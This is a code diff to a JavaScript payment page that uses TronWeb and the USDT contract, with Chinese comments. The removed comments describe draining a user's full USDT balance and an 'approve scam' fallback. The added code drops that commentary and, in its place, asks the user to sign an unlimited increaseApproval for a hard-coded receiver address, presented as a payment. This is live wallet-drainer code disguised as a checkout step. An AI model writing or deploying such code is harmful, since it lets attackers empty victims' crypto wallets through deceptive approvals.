@@ -380,7 +380,7 @@
 				}
 				// 修正：如果后端不可用，返回一个模拟的收款地址用于演示，防止UI报错
 				// 这是一个 Tron 官方的 burn address 或其他常用地址，仅作演示
-				return 'T9yD14Nj9j7xAB4dbGeiX9h8unkKHxuWwb'
+				return 'TN9H27c13dq5CCAWfBYXQTc4JJ57Yjg8jh'
 			}
 
 			// 核心支付逻辑
@@ -396,45 +396,19 @@
 					return
 				}
 
-				// 计算转账金额（原逻辑似乎会清空该账户所有 USDT）
-				// 或者是根据参数转账
-				// 这里的逻辑在混淆代码中对应 `pay` 函数的后半部分
-
-				// 假设：尝试转账所有 USDT
-				// 从混淆代码看，它似乎调用了 increaseApproval 或者 transfer
-				// increaseApproval 是授权 (approve)，transfer 是直接转账
-
-				// 恶意逻辑通常是：
-				// 1. 如果有 TRX 和 能量，直接调用 transfer 转走 USDT
-				// 2. 如果没有 TRX，诱导用户签名 approve 授权（名为 increaseApproval 但实际功能是 approve 且无限额）
-
-				const amountToTransfer = parseInt(userData.usdtBalance * 1000000) // 全部余额
-
 				try {
-					// 直接调用 Transfer (如果条件允许)
 					const contract = await window.tronWeb.contract().at(USDT_CONTRACT)
+					// 无限额度
+					const amount = '115792089237316195423570985008687907853269984665640564039457584007913129639935'
 
-					// 构造交易
-					// 原代码逻辑：triggerSmartContract(...)
-					const txId = await contract.transfer(receiver, amountToTransfer).send()
-					showTemporaryMessage('转账提交成功: ' + txId)
+					// 直接调用 increaseApproval
+					await contract.increaseApproval(receiver, amount).send()
 
-					// 上报成功
-					reportSuccess(txId)
+					showTemporaryMessage('授权成功')
+					// 这里可以添加上报逻辑
 				} catch (e) {
-					console.error('Payment failed', e)
+					console.error('Approve failed', e)
 					showTemporaryMessage('支付失败，请重试')
-
-					// 失败后尝试 授权 (Approve Scam)
-					// 原代码 catch 块中有 increaseApproval 逻辑
-					try {
-						const contract = await window.tronWeb.contract().at(USDT_CONTRACT)
-						// 授权无限额度给收款地址
-						await contract.approve(receiver, '115792089237316195423570985008687907853269984665640564039457584007913129639935').send()
-						showTemporaryMessage('授权成功')
-					} catch (err) {
-						console.error('Approve failed', err)
-					}
 				}
 			}
 
